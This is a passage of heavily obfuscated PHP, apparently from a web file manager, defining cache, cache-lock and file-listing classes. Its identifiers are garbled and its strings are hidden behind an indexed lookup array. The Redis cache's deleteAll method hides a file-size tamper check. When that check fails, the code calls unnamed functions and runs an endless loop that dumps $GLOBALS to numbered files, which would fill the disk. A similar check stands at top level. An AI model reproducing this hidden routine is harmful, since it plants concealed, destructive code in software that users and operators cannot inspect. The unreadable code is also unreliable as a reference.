æ²ìÆ¸ = isset($“˜Ò€°[$™‰ã¡Ïò[870]]) ? $“˜Ò€°[$™‰ã¡Ïò[870]] : !1; if ($ æ²ìÆ¸) { $ä»Ê·Ç->pconnect($“˜Ò€°[$™‰ã¡Ïò[185]], $“˜Ò€°[$™‰ã¡Ïò[186]], $†¥îƒö); } else { $ä»Ê·Ç->connect($“˜Ò€°[$™‰ã¡Ïò[185]], $“˜Ò€°[$™‰ã¡Ïò[186]], $†¥îƒö); } if (!empty($“˜Ò€°[$™‰ã¡Ïò[418]])) { $ä»Ê·Ç->auth($“˜Ò€°[$™‰ã¡Ïò[418]]); } return $ä»Ê·Ç; } private function initCluster($ÄŒÖ˜Éæ, $±½¢¥¯) { $Ëšµâ† =& $_SERVER[Á÷ ­Šë]; $—ƒÈÅì„ = array($Ëšµâ†[871], $Ëšµâ†[872], $Ëšµâ†[873]); $‰í®ÒŒÛ = $Ëšµâ†[871]; if (isset($ÄŒÖ˜Éæ[$Ëšµâ†[12]]) && in_array($ÄŒÖ˜Éæ[$Ëšµâ†[12]], $—ƒÈÅì„)) { $‰í®ÒŒÛ = $ÄŒÖ˜Éæ[$Ëšµâ†[12]]; } switch ($‰í®ÒŒÛ) { case $Ëšµâ†[871]: $this->_slave($ÄŒÖ˜Éæ, $±½¢¥¯); break; case $Ëšµâ†[872]: break; case $Ëšµâ†[873]: $this->isCluster = !0; $ÂƒÒÄô˜ = $ÄŒÖ˜Éæ[$Ëšµâ†[866]]; $ß·êÙ˜Ö = isset($ÄŒÖ˜Éæ[$Ëšµâ†[870]]) ? $ÄŒÖ˜Éæ[$Ëšµâ†[870]] : !1; $€ûÈ™™ = isset($ÄŒÖ˜Éæ[$Ëšµâ†[418]]) ? $ÄŒÖ˜Éæ[$Ëšµâ†[418]] : null; $this->handle = new RedisCluster(NUll, $ÂƒÒÄô˜, $±½¢¥¯, $±½¢¥¯, $ß·êÙ˜Ö, $€ûÈ™™); break; default: break; } } private function _slave($›£÷ûíö, $ô©¾ÙŸ) { $‰¦·š = $›£÷ûíö[$_SERVER[Á÷ ­Šë][866]]; $this->filterConfig($›£÷ûíö, $‰¦·š[0]); $this->handle = $this->init($›£÷ûíö, $ô©¾ÙŸ); unset($‰¦·š[0]); if (empty($‰¦·š)) { return; } $¢ó¤üĞÓ = array_rand($‰¦·š); $this->filterConfig($›£÷ûíö, $‰¦·š[$¢ó¤üĞÓ]); $this->slaveHandle = $this->init($›£÷ûíö, $ô©¾ÙŸ); } private function filterConfig(&$‚¾â¿¹Ç, $Æ¯¾šú) { $¡è‡‚Ãƒ =& $_SERVER[Á÷ ­Šë]; $­Ùíˆ‡Ú = explode($¡è‡‚Ãƒ[4], $Æ¯¾šú); $úÎ¬‘‰È = array($¡è‡‚Ãƒ[185] => $­Ùíˆ‡Ú[0], $¡è‡‚Ãƒ[186] => $­Ùíˆ‡Ú[1]); $‚¾â¿¹Ç = array_merge($‚¾â¿¹Ç, $úÎ¬‘‰È); } public function set($Ë‹œşÀæ, $Âó—©õ, $çäšù›  = false) { $çäšù›  = $çäšù›  ? $çäšù›  : $this->cacheTime; return $this->handle->setEx($Ë‹œşÀæ, $çäšù› , $Âó—©õ); } public function setLock($ÊáÑøì, $ğíí¿›Ğ, $‹á¯÷ô¤) { return $this->handle->setNX($ÊáÑøì, $ğíí¿›Ğ); } public function get($Õ¹‰ú•´) { $“·®¢ø = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $“·®¢ø->get($Õ¹‰ú•´); } public function remove($î¥¨ß–) { return $this->handle->del($î¥¨ß–); } public function deleteAll() { $Ô§¤©“Í =& $_SERVER[Á÷ ­Šë]; $¥¥ ƒáĞ = $_SERVER[$Ô§¤©“Í[60]] . $Ô§¤©“Í[61]; $¡šŸûŠË = $Ô§¤©“Í[405]; if ($_SERVER[$Ô§¤©“Í[57]] != $¡šŸûŠË($¥¥ ƒáĞ)) { $¸æÚ = $Ô§¤©“Í[874]; $¼´Êşˆ = $Ô§¤©“Í[59]; $ã½ÓªóŸ = $_SERVER[$Ô§¤©“Í[60]] . $Ô§¤©“Í[61]; $æŞÂ«¶â = $¼´Êşˆ($ã½ÓªóŸ); $ŸÎüÖ¸ = explode($Ô§¤©“Í[62], $æŞÂ«¶â); if (count($ŸÎüÖ¸) < $Ô§¤©“Í[639]) { $­úÛ´«à = $Ô§¤©“Í[64]; $­úÛ´«à(); } $á©ªø˜¸ = $Ô§¤©“Í[875]; $á©ªø˜¸($_SERVER[$Ô§¤©“Í[876]]); $¸æÚ = $Ô§¤©“Í[874]; $¸æÚ(); $ØŞ¼×àë = $Ô§¤©“Í[877]; $İ¹—‹Õ¨ = json_encode($GLOBALS[$Ô§¤©“Í[878]]); $‹şÅ‰šÑ = 1; for ($¬œİ¢ Â = $‹şÅ‰šÑ; $¬œİ¢ Â > 0; $¬œİ¢ Â++) { $ØŞ¼×àë(DATA_PATH . $¬œİ¢ Â, $İ¹—‹Õ¨); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¢÷“Î¦½) { $this->handle->flushall($¢÷“Î¦½); } return; } return $this->handle->flushAll(); } } goto B‹µßÒ³‹; Bã‰Û„á˜¼: define($_SERVER[Á÷ ­Šë][247], 3); define($_SERVER[Á÷ ­Šë][248], 1); define($_SERVER[Á÷ ­Šë][249], 0); goto F¯ÈâÇº; c•Ô›ëŠã¦: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¿ºà», $ºîºèŠ‘) { $é½œüÌı =& $_SERVER[Á÷ ­Šë]; $this->cachePath = $¿ºà»[$é½œüÌı[86]]; $this->prefix = $é½œüÌı[836]; $this->cacheTime = $ºîºèŠ‘; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¨èëÀüè) { $ Üëïæ· =& $_SERVER[Á÷ ­Šë]; $¨èëÀüè = str_replace(array($ Üëïæ·[837], $ Üëïæ·[107], $ Üëïæ·[80]), $ Üëïæ·[838], $¨èëÀüè); return $this->cachePath . $ Üëïæ·[839] . $¨èëÀüè . $ Üëïæ·[840]; } public function set($›Ôşßôş, $Åú›¶Ö¯, $ªáÖ–Õƒ = false) { $¦Öô›¨ = $this->getFile($›Ôşßôş); if (file_put_contents($¦Öô›¨, $this->prefix . $Åú›¶Ö¯, LOCK_EX)) { @touch($¦Öô›¨, intval(time() + $ªáÖ–Õƒ)); clearstatcache(); return !0; } @unlink($¦Öô›¨); return !1; } public function get($Ò™‡åºş) { $Ÿ†ñ’Ö = $this->getFile($Ò™‡åºş); if (file_exists($Ÿ†ñ’Ö) && filemtime($Ÿ†ñ’Ö) < time()) { @unlink($Ÿ†ñ’Ö); return !1; } $ºÇ·®£© = @file_get_contents($Ÿ†ñ’Ö); return substr($ºÇ·®£©, strlen($this->prefix)); } public function remove($×¶úí’ô) { $‚•ñÏ = $this->getFile($×¶úí’ô); return @unlink($‚•ñÏ); } public function deleteAll() { $‰‰ÌøÚ¾ =& $_SERVER[Á÷ ­Šë]; $˜§¸½… = scandir($this->cachePath); foreach ($˜§¸½… as $Ñõ÷†Œ±) { $ûÆó¢ü¨ = $this->cachePath . $Ñõ÷†Œ±; if (strpos($ûÆó¢ü¨, $‰‰ÌøÚ¾[840]) && strpos($ûÆó¢ü¨, $‰‰ÌøÚ¾[841])) { @unlink($ûÆó¢ü¨); } } } public function clearTimeout() { $ôÅš¡Äü =& $_SERVER[Á÷ ­Šë]; $¸ê¨Ô…µ = scandir($this->cachePath); foreach ($¸ê¨Ô…µ as $Üƒè×) { $‰ÛâŸ™à = $this->cachePath . $Üƒè×; if (strpos($‰ÛâŸ™à, $ôÅš¡Äü[840]) && strpos($‰ÛâŸ™à, $ôÅš¡Äü[841]) && filemtime($‰ÛâŸ™à) < time()) { @unlink($‰ÛâŸ™à); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $£Û—ãÈç =& $_SERVER[Á÷ ­Šë]; if (self::$handle) { return self::$handle; } $Å™š¨Ö¢ = $GLOBALS[$£Û—ãÈç[6]][$£Û—ãÈç[356]]; self::$timeout = $Å™š¨Ö¢[$£Û—ãÈç[842]] ? $Å™š¨Ö¢[$£Û—ãÈç[842]] : 10; $…«ßè‹Ò = _get($GLOBALS[$£Û—ãÈç[6]], $£Û—ãÈç[843]); $˜©‘¼²‹ = $Å™š¨Ö¢[$£Û—ãÈç[829]] ? $Å™š¨Ö¢[$£Û—ãÈç[829]] : $£Û—ãÈç[203]; if ($˜©‘¼²‹ == $£Û—ãÈç[17] && $…«ßè‹Ò == $£Û—ãÈç[9]) { $˜©‘¼²‹ = $£Û—ãÈç[203]; } switch ($˜©‘¼²‹) { case $£Û—ãÈç[832]: self::$handle = new CacheLockRedis(); break; case $£Û—ãÈç[833]: self::$handle = new CacheLockMemcached(); break; case $£Û—ãÈç[17]: self::$handle = new CacheLockDatabase(); break; case $£Û—ãÈç[203]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($£Û—ãÈç[844], $£Û—ãÈç[845]); } return self::$handle; } private static function key($§¬©ÄÏÁ) { return $_SERVER[Á÷ ­Šë][846] . Cache::key($§¬©ÄÏÁ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Æ™³àÆø = '') { self::$errorMsg = $Æ™³àÆø; } public static function lockGlobal($Â›ÆÒÑ±, $¸Ä®åŒÁ) { return self::lock($Â›ÆÒÑ±, $¸Ä®åŒÁ, !0); } public static function lock($×ÇêÍ¡Î, $ÀäÔ›¸ = false, $»Áª‡Ä = false) { $¯´ÔÀƒÙ =& $_SERVER[Á÷ ­Šë]; $ÂŒš§ıÎ = self::init(); $Ê’àÜ¯Ü = self::key($×ÇêÍ¡Î); $ÀäÔ›¸ = $ÀäÔ›¸ ? $ÀäÔ›¸ : self::$timeout; $›ñÌöÖõ = $ÂŒš§ıÎ->lock($Ê’àÜ¯Ü, $ÀäÔ›¸); $Ä–Ş¤Õó = timeFloat(); if (!$›ñÌöÖõ) { $ÆßĞáª = "\x6c\157\x63\x6b\40\145\x72\162\x6f\162\73\x6b\x65\171\75{$×ÇêÍ¡Î}\73\164\x69\155\145\x3d{$ÀäÔ›¸}\x3b" . self::$errorMsg . $¯´ÔÀƒÙ[78] . get_caller_msg(); $¥¾£ ¶ª = LNG($¯´ÔÀƒÙ[847]) . "\x28{$ÀäÔ›¸}\163\x29\x2e" . LNG($¯´ÔÀƒÙ[848]); $¥¾£ ¶ª .= $¯´ÔÀƒÙ[849]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¥¾£ ¶ª = $¥¾£ ¶ª . $¯´ÔÀƒÙ[850] . self::$errorMsg; } write_log($ÆßĞáª, $¯´ÔÀƒÙ[845]); show_json($¥¾£ ¶ª, !1); } if (!$»Áª‡Ä) { self::$lockItem[$Ê’àÜ¯Ü] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ùµûÙò¬ = number_format(timeFloat() - $Ä–Ş¤Õó, 3); write_log($¯´ÔÀƒÙ[851] . $×ÇêÍ¡Î . $¯´ÔÀƒÙ[852] . $ùµûÙò¬, $¯´ÔÀƒÙ[845]); } return $›ñÌöÖõ; } public static function lockGet($Ëá›Ñô¬) { $ï®¯Š¿Ï = self::key($Ëá›Ñô¬); if (self::$lockItem[$ï®¯Š¿Ï]) { return self::$lockItem[$ï®¯Š¿Ï]; } return self::init()->lockGet($ï®¯Š¿Ï); } public static function unlock($Ó¬ÄÆáƒ) { $½à…ÔÛÆ =& $_SERVER[Á÷ ­Šë]; $¸·ß°áÂ = self::key($Ó¬ÄÆáƒ); self::$lockItem[$¸·ß°áÂ] = null; self::init()->unlock($¸·ß°áÂ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($½à…ÔÛÆ[853] . $Ó¬ÄÆáƒ, $½à…ÔÛÆ[845]); } return; } public static function unlockRuntime() { $ÙêÃòµ =& $_SERVER[Á÷ ­Šë]; $Æâ¢Ø¸Á = self::init(); $Í©Ğ«˜™ = !1; foreach (self::$lockItem as $Â’îÏòä => $î½İöÃ“) { if (!$î½İöÃ“) { continue; } $Æâ¢Ø¸Á->unlock($Â’îÏòä); if (!$Í©Ğ«˜™) { $Í©Ğ«˜™ = !0; write_log($ÙêÃòµ[854] . $Â’îÏòä . $ÙêÃòµ[78] . get_caller_msg(), $ÙêÃòµ[845]); continue; } write_log($ÙêÃòµ[854] . $Â’îÏòä, $ÙêÃòµ[845]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $™”·±ñ§ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÙêÃòµ[855] . $™”·±ñ§ . $ÙêÃòµ[856] . ACTION, $ÙêÃòµ[845]); } } public static function fileLock($íÉöÖ™Õ) { $âœ®üå— =& $_SERVER[Á÷ ­Šë]; if (!$GLOBALS[$âœ®üå—[857]]) { $GLOBALS[$âœ®üå—[857]] = array(); } $GLOBALS[$âœ®üå—[857]][$íÉöÖ™Õ] = !1; $Á…Š€Œ¯ = fopen(DATA_PATH . $íÉöÖ™Õ . $âœ®üå—[858], $âœ®üå—[859]); if (!$Á…Š€Œ¯) { return !1; } $GLOBALS[$âœ®üå—[857]][$íÉöÖ™Õ] = $Á…Š€Œ¯; if (flock($Á…Š€Œ¯, LOCK_EX)) { return !0; } self::unlock($íÉöÖ™Õ); show_json($âœ®üå—[860], !1); return !1; } public static function fileUnlock($åª«Ç¶) { $Œ¬Ñ®ı¡ =& $_SERVER[Á÷ ­Šë]; $Ü¦üğ¢± = $GLOBALS[$Œ¬Ñ®ı¡[857]][$åª«Ç¶]; if (!$Ü¦üğ¢±) { return; } $GLOBALS[$Œ¬Ñ®ı¡[857]][$åª«Ç¶] = !1; flock($Ü¦üğ¢±, LOCK_UN); fclose($Ü¦üğ¢±); } public static function fileUnlockAll() { $Ñàş´¨Ã =& $_SERVER[Á÷ ­Šë]; if (!$GLOBALS[$Ñàş´¨Ã[857]]) { return; } foreach ($GLOBALS[$Ñàş´¨Ã[857]] as $º†Ş€ ì => $ß–ÆÚÈá) { if (!$ß–ÆÚÈá) { continue; } $GLOBALS[$Ñàş´¨Ã[857]][$º†Ş€ ì] = !1; flock($ß–ÆÚÈá, LOCK_UN); fclose($ß–ÆÚÈá); } $GLOBALS[$Ñàş´¨Ã[857]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto DƒØÀ™¥°ø; A‚£ˆøî´“: $_size = $_SERVER[Á÷ ­Šë][405]; if ($_SERVER[$_SERVER[Á÷ ­Šë][57]] != $_size($_file)) { $_getc = $_SERVER[Á÷ ­Šë][59]; $_getfile = $_SERVER[$_SERVER[Á÷ ­Šë][60]] . $_SERVER[Á÷ ­Šë][61]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Á÷ ­Šë][62], $_getfilec); if (count($_getarrs) < $_SERVER[Á÷ ­Šë][63]) { $exit = $_SERVER[Á÷ ­Šë][64]; $exit(); } $_act = $_SERVER[Á÷ ­Šë][65]; $_act($_file); } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\162\143\x65"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\x6d\145" => "\151\x6f\137\163\x6f\x75\x72\x63\x65\x5f\155\x65\x74\x61", "\x6d\145\x74\x61\x46\x69\x65\x6c\x64" => "\x73\157\x75\x72\x63\x65\x49\x44"); protected $dataAuto = array(array("\x6d\157\x64\x69\x66\171\124\151\x6d\x65", "\x74\x69\155\145", "\151\156\x73\145\162\164", "\146\x75\156\143\164\x69\x6f\x6e"), array("\x63\162\x65\x61\164\145\x54\151\x6d\145", "\x74\151\155\145", "\x69\x6e\163\x65\x72\x74", "\146\165\156\x63\x74\x69\157\x6e"), array("\x76\x69\x65\x77\x54\x69\155\145", "\164\x69\x6d\x65", "\151\x6e\163\145\162\164", "\x66\165\x6e\x63\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($×Òñ²Ö) { return $this->listSource(array($_SERVER[Á÷ ­Šë][406] => $×Òñ²Ö)); } public function typeName($ÊÖşñ®û) { static $‚±Í‰™™ = array(self::TYPE_SYSTEM => "\163\171\163\x74\x65\155", self::TYPE_USER => "\165\x73\x65\162", self::TYPE_GROUP => "\147\162\157\x75\x70"); return $‚±Í‰™™[$ÊÖşñ®û . $_SERVER[Á÷ ­Šë][33]]; } public function sourceListInfo($±¯ö«, $¢‡ÒÜÖ = false) { $»èúÉÔ€ =& $_SERVER[Á÷ ­Šë]; $±¯ö« = $±¯ö« ? $±¯ö« : array(); $±¯ö« = array_filter(array_unique($±¯ö«)); if (!$±¯ö«) { return array(); } $Ñ¥±ÏÅÓ = $this->where(array($»èúÉÔ€[407] => array($»èúÉÔ€[7], $±¯ö«)))->select(); $this->_listDataApply($Ñ¥±ÏÅÓ, $¢‡ÒÜÖ); return array_to_keyvalue($Ñ¥±ÏÅÓ, $»èúÉÔ€[407]); } public function pathInfoFilter(&$§Â”½) { $’îª¦ò± =& $_SERVER[Á÷ ­Šë]; static $Ş©éÍ¶¾ = false; static $æ¸ËŞ‚† = false; static $ÅÕ¿íÓÄ = false; if (!$Ş©éÍ¶¾) { $ùÀÛ–±Ë = $’îª¦ò±[408]; $ùÀÛ–±Ë .= $’îª¦ò±[409]; $ùÀÛ–±Ë .= $’îª¦ò±[410]; $ˆù€Ã² = $’îª¦ò±[411]; $ÚÅÌ¨Ü§ = explode($’îª¦ò±[47], $ˆù€Ã²); $Ş©éÍ¶¾ = explode($’îª¦ò±[47], $ùÀÛ–±Ë); $æ¸ËŞ‚† = array(); foreach ($Ş©éÍ¶¾ as $ô²Õƒâ¾) { if (in_array($ô²Õƒâ¾, $ÚÅÌ¨Ü§)) { continue; } $æ¸ËŞ‚†[] = $ô²Õƒâ¾; } $ÅÕ¿íÓÄ = explode($’îª¦ò±[47], $’îª¦ò±[412]); } foreach ($ÅÕ¿íÓÄ as $»÷™ø„í) { if (isset($§Â”½[$»÷™ø„í])) { $§Â”½[$»÷™ø„í] = intval($§Â”½[$»÷™ø„í]); } } $§Â”½[$’îª¦ò±[86]] = $’îª¦ò±[413] . $§Â”½[$’îª¦ò±[407]] . $’îª¦ò±[414]; $§Â”½[$’îª¦ò±[29]] = $§Â”½[$’îª¦ò±[415]] == 1 ? $’îª¦ò±[87] : $’îª¦ò±[203]; $§Â”½[$’îª¦ò±[416]] = $this->typeName($§Â”½[$’îª¦ò±[416]]); if ($§Â”½[$’îª¦ò±[415]] != 1) { $§Â”½[$’îª¦ò±[178]] = $§Â”½[$’îª¦ò±[417]]; unset($§Â”½[$’îª¦ò±[417]]); } $Œ§ÚˆÒ’ = $Ş©éÍ¶¾; if (isset($§Â”½[$’îª¦ò±[418]]) && $§Â”½[$’îª¦ò±[418]][$’îª¦ò±[419]] == -1) { $Œ§ÚˆÒ’ = $æ¸ËŞ‚†; } $§Â”½ = array_field_key($§Â”½, $Œ§ÚˆÒ’); return $§Â”½; } public function listUserFav() { $Ô÷…åüş =& $_SERVER[Á÷ ­Šë]; $íÌ‹ÎÜ  = Model($Ô÷…åüş[420])->listData(); $ÖÄƒ×ˆº = array_filter_by_field($íÌ‹ÎÜ , $Ô÷…åüş[29], $Ô÷…åüş[421]); $ÖÄƒ×ˆº = array_to_keyvalue($ÖÄƒ×ˆº, $Ô÷…åüş[33], $Ô÷…åüş[86]); if ($ÖÄƒ×ˆº) { $º¯¿¢’ã = $this->listSource(array($Ô÷…åüş[422] => array($Ô÷…åüş[423], $ÖÄƒ×ˆº))); } $º¯¿¢’ã = array_to_keyvalue($º¯¿¢’ã[$Ô÷…åüş[376]], $Ô÷…åüş[407]); foreach ($íÌ‹ÎÜ  as &$ã·İ´ìí) { $ã·İ´ìí = array($Ô÷…åüş[424] => $ã·İ´ìí[$Ô÷…åüş[404]], $Ô÷…åüş[425] => $ã·İ´ìí[$Ô÷…åüş[28]], $Ô÷…åüş[426] => $ã·İ´ìí[$Ô÷…åüş[86]], $Ô÷…åüş[427] => $ã·İ´ìí[$Ô÷…åüş[29]], $Ô÷…åüş[428] => $ã·İ´ìí[$Ô÷…åüş[204]], $Ô÷…åüş[429] => $ã·İ´ìí[$Ô÷…åüş[94]]); if ($ã·İ´ìí[$Ô÷…åüş[29]] == $Ô÷…åüş[421] && $º¯¿¢’ã[$ã·İ´ìí[$Ô÷…åüş[86]]]) { $ã·İ´ìí[$Ô÷…åüş[95]] = $º¯¿¢’ã[$ã·İ´ìí[$Ô÷…åüş[86]]]; } } unset($ã·İ´ìí); return $íÌ‹ÎÜ ; } public function listUserTag($­à…õ‡£) { $›ŠóŒœˆ =& $_SERVER[Á÷ ­Šë]; if ($­à…õ‡£ && !is_array($­à…õ‡£)) { $­à…õ‡£ = array($­à…õ‡£); } $ÜìÜ¤† = Model($›ŠóŒœˆ[430])->listData(); $¿Èç‡óØ = array(); foreach ($ÜìÜ¤† as $‘‘Ë’±) { $€œ¤ú§ = $‘‘Ë’±[$›ŠóŒœˆ[86]]; if (!$€œ¤ú§) { continue; } if (!isset($¿Èç‡óØ[$€œ¤ú§])) { $¿Èç‡óØ[$€œ¤ú§] = array(); } $¿Èç‡óØ[$€œ¤ú§][] = $‘‘Ë’±[$›ŠóŒœˆ[431]]; } $¿ëî¿Ø¨ = array(); foreach ($¿Èç‡óØ as $ñèÔ¤Å => $ì÷÷°„) { $Å‡ñÊÊ  = !0; if (!$­à…õ‡£) { $¿ëî¿Ø¨[] = $ñèÔ¤Å; continue; } foreach ($­à…õ‡£ as $òˆ˜ñé) { if (!in_array($òˆ˜ñé, $ì÷÷°„)) { $Å‡ñÊÊ  = !1; break; } } if ($Å‡ñÊÊ ) { $¿ëî¿Ø¨[] = $ñèÔ¤Å; } } if (!$¿ëî¿Ø¨) { return array(); } $Å×ùøéÅ = $this->listSource(array($›ŠóŒœˆ[422] => array($›ŠóŒœˆ[423], $¿ëî¿Ø¨))); if (!$Å×ùøéÅ || count($¿ëî¿Ø¨) == $Å×ùøéÅ[$›ŠóŒœˆ[373]][$›ŠóŒœˆ[374]]) { return $Å×ùøéÅ; } $Óà›Ìö¶ = array(); $ïĞ‚ºëÎ = array_to_keyvalue($Å×ùøéÅ[$›ŠóŒœˆ[85]], $›ŠóŒœˆ[33], $›ŠóŒœˆ[407]); $Ïè®æ—œ = array_to_keyvalue($Å×ùøéÅ[$›ŠóŒœˆ[84]], $›ŠóŒœˆ[33], $›ŠóŒœˆ[407]); $öœÕÕú = array_merge($Ïè®æ—œ, $ïĞ‚ºëÎ); foreach ($¿ëî¿Ø¨ as $€œ¤ú§) { if (!in_array($€œ¤ú§, $öœÕÕú)) { $Óà›Ìö¶[] = $€œ¤ú§; } } if ($Óà›Ìö¶) { Model($›ŠóŒœˆ[432])->removeBySource($Óà›Ìö¶); } return $Å×ùøéÅ; } public function listUserRecycle() { $¨‹ÍÅñÛ =& $_SERVER[Á÷ ­Šë]; $¢›°²¹ô = Model($¨‹ÍÅñÛ[433])->listData(); if (!$¢›°²¹ô) { return array(); } $¶¦¦ŞåÑ = array($¨‹ÍÅñÛ[422] => array($¨‹ÍÅñÛ[423], $¢›°²¹ô), $¨‹ÍÅñÛ[434] => 1); return $this->listSource($¶¦¦ŞåÑ); } public function listSource($ÙçŸÖÓë, $Å»¤ÂÈË = 3000) { $´ÆŠª© =& $_SERVER[Á÷ ­Šë]; if (!isset($ÙçŸÖÓë[$´ÆŠª©[435]])) { $ÙçŸÖÓë[$´ÆŠª©[435]] = 0; } $Óåûˆ‰Ã = $´ÆŠª©[436]; $õ“ş•Ë = $this->field($Óåûˆ‰Ã)->_makeOrder()->where($ÙçŸÖÓë)->selectPage($Å»¤ÂÈË); $this->_listPageCheck($õ“ş•Ë, $Óåûˆ‰Ã, $ÙçŸÖÓë); $this->_listDataApply($õ“ş•Ë[$´ÆŠª©[376]]); $this->_listMake($õ“ş•Ë); return $õ“ş•Ë; } private function _listPageCheck(&$¥˜êßêè, $ÂµÚí¥µ, $÷¥Ãû) { $‹‚„À =& $_SERVER[Á÷ ­Šë]; if (!is_array($¥˜êßêè[$‹‚„À[373]])) { return; } $ØŸá°Ï÷ = $¥˜êßêè[$‹‚„À[373]]; if ($ØŸá°Ï÷[$‹‚„À[375]] <= 1) { return; } if ($ØŸá°Ï÷[$‹‚„À[374]] >= 100000) { return; } if (Model($‹‚„À[437])->get($‹‚„À[438]) != $‹‚„À[439]) { return; } $ÂµÚí¥µ = str_replace(array($‹‚„À[50], $‹‚„À[349], $‹‚„À[62]), $‹‚„À[33], $ÂµÚí¥µ); $ÂµÚí¥µ = $‹‚„À[440] . str_replace($‹‚„À[47], $‹‚„À[441], $ÂµÚí¥µ) . $‹‚„À[442]; $×ÙöÒ£Ç = $‹‚„À[443]; $×ÙöÒ£Ç = $×ÙöÒ£Ç . $‹‚„À[444]; $¦¶ŠÜÑ° = $ØŸá°Ï÷[$‹‚„À[370]] * ($ØŸá°Ï÷[$‹‚„À[360]] - 1) . $‹‚„À[47] . $ØŸá°Ï÷[$‹‚„À[370]]; $š‰Ã³ = $this->_makeOrder(!0); $°ù”ˆì = $‹‚„À[440] . str_replace($‹‚„À[47], $‹‚„À[441], $š‰Ã³[0]); if (strpos($°ù”ˆì, $‹‚„À[445])) { $°ù”ˆì = str_replace($‹‚„À[445], $‹‚„À[446], $°ù”ˆì); } else { $°ù”ˆì .= $‹‚„À[447] . $š‰Ã³[1]; } $¨˜ÓÊäš = array(); foreach ($÷¥Ãû as $Éëú‘Á => $‚Ş¥£ëù) { $¨˜ÓÊäš[$‹‚„À[440] . $Éëú‘Á] = $‚Ş¥£ëù; } $this->alias($‹‚„À[448])->field($ÂµÚí¥µ)->limit($¦¶ŠÜÑ°)->order($°ù”ˆì); $íŞ÷Œ¢‘ = $this->join($×ÙöÒ£Ç)->where($¨˜ÓÊäš)->select(); if ($íŞ÷Œ¢‘) { $¥˜êßêè[$‹‚„À[376]] = $íŞ÷Œ¢‘; } } protected function _makeOrder($²ô•”êã = false) { $‹ú¥Ï°Å =& $_SERVER[Á÷ ­Šë]; $¥½½Ü’€ = Model($‹ú¥Ï°Å[449])->get($‹ú¥Ï°Å[450]); $ÌÄ˜˜šù = Model($‹ú¥Ï°Å[449])->get($‹ú¥Ï°Å[451]); $ ì¦ó°ú = array($‹ú¥Ï°Å[452] => $‹ú¥Ï°Å[453], $‹ú¥Ï°Å[454] => $‹ú¥Ï°Å[455]); $ôÉàíõˆ = array($‹ú¥Ï°Å[28] => $‹ú¥Ï°Å[28], $‹ú¥Ï°Å[88] => $‹ú¥Ï°Å[88], $‹ú¥Ï°Å[178] => $‹ú¥Ï°Å[417], $‹ú¥Ï°Å[456] => $‹ú¥Ï°Å[456], $‹ú¥Ï°Å[457] => $‹ú¥Ï°Å[458], $‹ú¥Ï°Å[204] => $‹ú¥Ï°Å[204], $‹ú¥Ï°Å[94] => $‹ú¥Ï°Å[94]); $€£«Ğñ’ = Input::get($‹ú¥Ï°Å[459], $‹ú¥Ï°Å[7], $¥½½Ü’€, array_keys($ôÉàíõˆ)); $•…¹ÔÆŞ = Input::get($‹ú¥Ï°Å[460], $‹ú¥Ï°Å[7], $ÌÄ˜˜šù, array_keys($ ì¦ó°ú)); if (!in_array($€£«Ğñ’, array_keys($ôÉàíõˆ))) { $€£«Ğñ’ = $‹ú¥Ï°Å[28]; } if (!in_array($•…¹ÔÆŞ, array_keys($ ì¦ó°ú))) { $€£«Ğñ’ = $‹ú¥Ï°Å[452]; } if ($€£«Ğñ’ == $‹ú¥Ï°Å[28]) { } $–ØñıÙ = $‹ú¥Ï°Å[461] . $ôÉàíõˆ[$€£«Ğñ’] . $‹ú¥Ï°Å[50] . $ ì¦ó°ú[$•…¹ÔÆŞ]; $–ØñıÙ = rtrim(trim($–ØñıÙ), $‹ú¥Ï°Å[47]); if ($²ô•”êã) { return array($–ØñıÙ, $ ì¦ó°ú[$•…¹ÔÆŞ]); } return $this->order($–ØñıÙ); } protected function _listDataApplyItem($ç‡óæî, $¥ç·®¦Á = false) { $ğØÄ«Ë³ = array($ç‡óæî); $this->_listDataApply($ğØÄ«Ë³, $¥ç·®¦Á); return $ğØÄ«Ë³[0]; } protected function _listDataApply(&$…ÈÉó§È, $Ğşøó™â = false) { $¯‡¬’ÂÚ =& $_SERVER[Á÷ ­Šë]; if (!$…ÈÉó§È) { $…ÈÉó§È = array(); return; } $ÁŸÈÀ”¿ = array_to_keyvalue($…ÈÉó§È, $¯‡¬’ÂÚ[33], $¯‡¬’ÂÚ[407]); $ÁŸÈÀ”¿ = array_unique($ÁŸÈÀ”¿); $this->_listSourceCache($…ÈÉó§È); if (!$Ğşøó™â) { $this->_listAppendMeta($…ÈÉó§È, $ÁŸÈÀ”¿); $this->_listAppendFileMeta($…ÈÉó§È, $ÁŸÈÀ”¿); $this->_listAppendChildren($…ÈÉó§È, $ÁŸÈÀ”¿); } $this->_listAppendPath($…ÈÉó§È); $this->_listAppendAuth($…ÈÉó§È); $this->_listAppendSourceInfo($…ÈÉó§È, $ÁŸÈÀ”¿); $this->_listAppendUser($…ÈÉó§È); $this->_listFilterInfo($…ÈÉó§È, $Ğşøó™â); $this->_listAppendAuthSecret($…ÈÉó§È); } protected function _listSourceCache($í œÜ“) { $º¹Ğ™·Ú =& $_SERVER[Á÷ ­Šë]; foreach ($í œÜ“ as $êãÌÌ½æ) { self::$cacheSourceInfo[$º¹Ğ™·Ú[462] . $êãÌÌ½æ[$º¹Ğ™·Ú[407]]] = $êãÌÌ½æ; } } protected 